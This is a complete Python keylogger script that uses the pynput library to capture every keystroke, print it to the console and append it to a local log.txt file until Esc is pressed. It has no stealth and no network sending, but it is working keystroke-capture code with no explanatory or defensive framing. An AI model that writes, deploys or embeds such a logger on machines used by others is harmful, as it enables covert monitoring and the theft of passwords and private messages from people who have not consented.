import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    global keys
    keys.append(key)
    write_file(keys)
    
    try:
        print(f'Alphanumeric key {key.char} pressed')
    except AttributeError:
        print(f'Special key {key} pressed')

def write_file(keys):
    with open('log.txt', 'a') as f:  # Use 'a' to append to the file
        for key in keys:
            k = str(key).replace("'", "")
            
            # Handle special keys for readability
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("enter") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)
            else:
                f.write(f"[{k}]")
        
        keys.clear()  # Clear keys after writing to avoid duplicate logging

def on_release(key):
    print(f'{key} released')
    if key == Key.esc:
        # Stop listener
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
